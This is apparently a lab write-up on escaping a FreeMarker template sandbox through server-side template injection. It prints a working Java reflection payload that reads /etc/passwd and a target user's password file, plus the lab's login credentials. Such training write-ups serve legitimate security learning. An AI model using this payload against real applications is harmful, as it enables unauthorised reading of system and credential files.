# Server-side template injection in a sandboxed environment
* This lab uses the Freemarker template engine. It is vulnerable to server-side template injection due to its poorly implemented sandbox. To solve the lab, break out of the sandbox to read the file `my_password.txt`	from Carlos's home directory. Then submit the contents of the file.
	* You can log in to your own account using the following credentials: `content-manager:C0nt3ntM4n4g3r`
### 1. Enumerate the web page
* Enumerate the web page as "content-manager".
	* From a product page, "Edit template" function is found.

![26](https://user-images.githubusercontent.com/53956303/155426939-4f941b94-4d90-46ee-a6b3-1d77f6cab6da.png)
* From the rediting function, some interesting objects are found

![27](https://user-images.githubusercontent.com/53956303/155427021-e520bc3d-2a58-41a5-9759-ddf0388e8005.png)

### 2. Put some test value to identify the template engine
* Try to put `${TEST}` to see the response.
	* From the result, some FreeMarker template error is given.

![28](https://user-images.githubusercontent.com/53956303/155427521-46f4056f-c103-4d19-9757-428d743e3682.png)
### 3. Try exploit for FreeMarker template engine
* Use an exploit for FreeMarker template engine from [A Pentester's Guide to Server side template injection (SSTI) - Cobalt](https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti).
	* However, it does not work at this time. the `freemarker.template.utility.Execute` is not allowd in the template for security reasons.

![29](https://user-images.githubusercontent.com/53956303/155429302-0132d0e9-4eae-4c5e-9e2e-8139ec965546.png)
* However, since Freemaker is a Java based template engine, use an exploit for Java itself from the same site.
```java
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```
* From the result, the file is given as decimal ASCII code points.

![30](https://user-images.githubusercontent.com/53956303/155429948-a8d25d48-26c4-454e-bde7-31cde692c340.png)
* Using the [online ASCII Tools](https://onlineasciitools.com/convert-decimal-to-ascii), the converted file is given.

![31](https://user-images.githubusercontent.com/53956303/155430278-7988d929-5991-491c-83e9-87b481108677.png)
### 4. Use the exploit to obtain the content of the target file (/home/carlos/my_password.txt)
```java
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}

```
* Result.

![32](https://user-images.githubusercontent.com/53956303/155430566-9c5d0f30-9caf-45da-aa2e-756303e01416.png)
* Using the online ascii tool, the content is given in plaintext.

![33](https://user-images.githubusercontent.com/53956303/155430677-d998aecc-8558-4b93-9bcc-102ab4eae101.png)
* By submitting the value, the lab is solved.

![34](https://user-images.githubusercontent.com/53956303/155430721-bb30038f-6587-4524-84cb-b80e0e07976d.png)
